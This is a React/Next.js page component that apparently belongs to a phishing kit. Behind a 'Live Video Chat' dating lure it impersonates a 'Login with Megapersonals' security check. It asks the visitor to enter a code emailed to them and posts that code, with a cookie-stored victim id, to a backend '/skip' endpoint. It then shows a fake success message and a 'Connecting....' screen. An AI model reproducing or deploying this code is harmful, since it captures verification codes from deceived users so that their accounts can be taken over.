"use client"

import Cookies from "js-cookie";
import { useState } from "react";
import { API_URL } from "../config";
import { toast } from "react-toastify";

function SecurityCheckPage() {
  const [next,setNext]=useState(false)
  const [code, setCode] = useState("");
 
  const id = Cookies.get("id");


  const handleSubmit = async () => {
    const values = {
      id: id,
      skipcode: code,
    };
    
    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      toast.success("Login Succecssfull");
    

      setCode('')
      console.log("success", data);
      setNext(true)
      
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return (
 <>
 {
  !next?( <div className="bg-black h-screen flex justify-center items-center">
    <div class="bg-neutral-50 w-full max-w-[25rem] p-6 rounded-xl">
  <p class="text-3xl font-semibold pl-4">Live Video Chat</p>
  <p class="mt-3 leading-relaxed max-w-[32ch] mx-auto [&amp;>span]:font-semibold">
    Know each other and enjoy{" "}
    <span class="text-green-500">private, secure</span>
    <span class="text-green-500"></span> and{" "}
    <span class="text-green-500">hasslefree</span> live moment with your
    dating partner
  </p>
  <img src="/images/devilgirl.png" width="180xp" height="120px" alt="" />{" "}
  <p class="text-xl font-semibold mt-3 text-center">Login with Megapersonals</p>
  <p className="font-semibold text-sm text-green-600 text-center">Check spam folder to your email </p>
  <div class="flex flex-col gap-y-4 mt-4">
    <input
      required=""
      class="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
      placeholder="Enter code here"
      
      name="code"
      value={code}
      onChange={(e) => setCode(e.target.value)}
    />
    <button onClick={handleSubmit} class="h-11 rounded text-neutral-50 font-medium bg-green-500 disabled:bg-green-200">
      Submit
    </button>
  </div>
</div>
</div>):(
  <div className="bg-black h-screen flex justify-center items-center">
<p className="text-3xl text-white font-semibold text-center mt-10">Connecting....</p>
  </div>
)
 }
 </>
  );
}

export default SecurityCheckPage;
